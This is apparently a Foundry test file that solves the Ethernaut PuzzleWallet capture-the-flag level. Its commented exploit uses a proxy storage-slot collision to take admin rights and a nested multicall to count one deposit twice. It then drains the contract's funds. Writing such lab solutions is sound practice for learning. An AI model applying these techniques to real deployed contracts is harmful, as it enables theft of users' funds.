// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/PuzzleWallet.sol";
import "src/levels/PuzzleWalletFactory.sol";

contract TestPuzzleWallet is BaseTest {
    PuzzleProxy private level;
    PuzzleWallet puzzleWallet;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new PuzzleWalletFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /** CODE YOUR SETUP HERE */

        levelAddress = payable(this.createLevelInstance{value: 0.001 ether}(true));
        level = PuzzleProxy(levelAddress);
        puzzleWallet = PuzzleWallet(address(level));

        // Check that the contract is correctly setup
        assertEq(level.admin(), address(levelFactory));
    }

    function exploitLevel() internal override {
        /** CODE YOUR EXPLOIT HERE */

        vm.startPrank(player, player);

        // My brain hurts so much after finishing this challenge :|

        // Update the proposeNewAdmin variable in the proxy contract
        // Note that proposeNewAdmin is slot0 in the proxy contract
        level.proposeNewAdmin(player);

        // Call the proxy contract that will call the implementation
        // Because the impl. is called via delegate call it will use the proxy context
        // Because in `PuzzleWallet` `owner` is in slot0 the value read in the proxy context
        // will be the value inside the slot0 of proxy that is the variable `pendingAdmin` that we changed before
        // So in this case for the implementation code executed in the proxy context WE ARE THE ADMIN!
        puzzleWallet.addToWhitelist(player);

        // Now are both owner and whitelisted when the implementation is executed (with proxy context)
        // To finish the exploit we need to become the proxy admin
        // In order to do that we can leverage the fact that PuzzleWallet and PuzzleProxy are not respecting
        // the best practice to have the same storage layout
        // So what we want to do is to change the `maxBalance` that will change (because it will write in the proxy state)
        // the value of `admin`. We just need to conert the player1 address to a uint256 by casting it to `uint256(player1Address)`

        // The problem is that before being able to change the maxValue we need to find a way to drain the balance in the
        // proxy contract otherwise the tx for `setMaxBalance(uint256(player1Address))` will revert

        // If we look at the `multicall` method we see that there is a check to prevent to call multiple times `deposit`
        // That check is needed because otherwise you would be able to send 1 ETH but call multiple X time deposit
        // and even if you have just sent 1 ETH the `balances[msg.sender]` would be updated X time

        // So we have the restriction to be able to call `deposit` only 1 time in the multicall
        // But what if in the same multicall we call another multicall (a multicall-inception!)
        // in this way we are able to call two times the deposit but sending only the amount of ETH for one!
        bytes[] memory callsDeep = new bytes[](1);
        callsDeep[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector);

        bytes[] memory calls = new bytes[](2);
        calls[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector);
        calls[1] = abi.encodeWithSelector(PuzzleWallet.multicall.selector, callsDeep);
        puzzleWallet.multicall{value: 0.001 ether}(calls);

        // At this point inside the contract there are 0.002 ether (one is from us and one from the PuzzleWalletFactory)
        // But `balances[player]` is equal to 0.002 ether!
        // We are able to call the `execute` method in a way that will send to us the whole contract's balance
        puzzleWallet.execute(player, 0.002 ether, "");

        // Now that the balance is 0 we can call the `setMaxBalance`. Always for the same reason (not having the same storage layout)
        // when we execute the code on the implementation we are updating the slot1 (maxBalance) but on the proxy contract.
        // In the proxy contract the slot1 is used by the `admin` state variable.
        puzzleWallet.setMaxBalance(uint256(player));

        assertEq(level.admin(), player);

        vm.stopPrank();
    }
}
